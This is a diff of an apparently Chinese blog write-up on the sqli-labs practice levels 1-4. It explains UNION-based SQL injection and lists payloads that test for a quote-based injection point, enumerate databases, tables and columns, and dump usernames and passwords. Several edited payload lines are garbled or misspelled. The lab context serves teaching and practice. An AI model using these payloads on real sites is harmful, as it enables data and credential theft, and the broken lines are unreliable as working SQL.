@@ -478,6 +478,9 @@
 <p>Part two.</p>
 <h5 id="1-sqli-1-4"><a href="#1-sqli-1-4" class="headerlink" title="1.sqli 1-4"></a>1.sqli 1-4</h5><hr>
 <p>第一关</p>
+<p>讲一下<strong>联合查询</strong>：</p>
+<p>联合查询，union 前后的两个注入语句都是执行成功的。而这里第一个执行的结果输出了，以致第二个sql查询结果无法显示出来。</p>
+<p>那我们可以让第一个结果执行为空，第二个就可以显示出来了</p>
 <h5 id="注入点判断"><a href="#注入点判断" class="headerlink" title="注入点判断"></a>注入点判断</h5><p>1.在URL框里用get属于get型。经过语句and 1=2–+测试 ，页面回显正常，所以该地方不是数值查询</p>
 <p>2.接着尝试在id后面加上’，发现页面回显不正常，表示可能存在SQL字符注入</p>
 <p>3.输入–+将sql后面的语句注视掉后，发现页面回显正常，则证明这个地方是单引号字符型注入</p>
@@ -488,11 +491,11 @@
 <p> 当前</p>
 <p>?id=-1’union select 1,database(),3</p>
 <p>所有 </p>
-<p>?id=-1’ union select 1，（select group_concat(schema_name) from informaion_schema.schemata),3 –+</p>
+<p>?id=-1’ union select 1，（ group_concat(schema_name) from informaion_schema.schemata),3 –+</p>
 <p>表名</p>
-<p>?id=-1’ union select 1,2,select group_concat(table_name) from information_schema.tables where table_schema=database()–+</p>
+<p>?id=-1’ union select 1,2,t group_concat(table_name) from information_schema.tables where table_schema=database()–+</p>
 <p>列名</p>
-<p>?id=-1’ union select 1,2,select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=’security’–+</p>
+<p>?id=-1’ union select 1,2, group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=’security’–+</p>
 <p>字段名</p>
 <p>?id=-1’ union select 1,2,select group_concat(password,username) from security.users–+</p>
 <hr>
